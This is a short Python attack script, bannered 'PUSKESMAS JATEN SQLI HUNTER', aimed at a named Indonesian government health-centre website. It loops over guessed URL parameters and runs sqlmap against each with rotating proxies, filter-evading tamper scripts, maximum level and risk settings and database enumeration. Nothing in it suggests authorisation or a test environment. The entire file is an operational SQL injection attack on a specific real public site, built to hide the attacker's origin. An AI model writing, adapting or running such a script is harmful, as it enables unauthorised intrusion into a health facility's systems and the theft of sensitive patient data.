import requests
import socks
import socket
import sys
import random
import time
import subprocess
import threading
import os

# --- CONFIGURATION ---
TARGET_URL = "https://puskesjaten1.karanganyarkab.go.id"
SQLMAP_PATH = "python sqlmap.py"
TAMPER_SCRIPTS = "space2comment,between,randomcase,space2plus"
PROXY_FILE = "proxies.txt"

def banner():
    print("""
    ╔══════════════════════════════════════╗
    ║      PUSKESMAS JATEN SQLI HUNTER     ║
    ║   Target: puskesjaten1 (Proxy Rotation) ║
    ╚══════════════════════════════════════╝
    """)

def run_sqli_scan():
    if not os.path.exists(PROXY_FILE):
        print(f"[!] Error: {PROXY_FILE} not found!")
        return

    print(f"\n[+] Starting SQL Injection with Proxy Rotation from: {PROXY_FILE}")
    
    # 1. Define Injection Points
    targets = [
        f"{TARGET_URL}/?id=1",
        f"{TARGET_URL}/?p=1",
        f"{TARGET_URL}/?page_id=1",
        f"{TARGET_URL}/index.php?id=1",
        f"{TARGET_URL}/news.php?id=1"
    ]
    
    print(f"[*] Loaded {len(targets)} potential injection points.")
    
    for url in targets:
        print(f"\n[>] Attacking: {url}")
        
        # Construct SQLMap Command with Proxy File
        cmd = [
            sys.executable, "sqlmap.py",
            "-u", url,
            "--proxy-file", PROXY_FILE,  # Rotate proxies automatically
            "--tamper", TAMPER_SCRIPTS,
            "--level=5", "--risk=3",
            "--random-agent",
            "--batch", "--threads=10",
            "--timeout=10",              # Fail fast on bad proxies
            "--retries=2",               # Retry with next proxy
            "--dbs" 
        ]
        
        try:
            subprocess.run(cmd)
        except Exception as e:
            print(f"[!] Error running sqlmap: {e}")

if __name__ == "__main__":
    banner()
    run_sqli_scan()
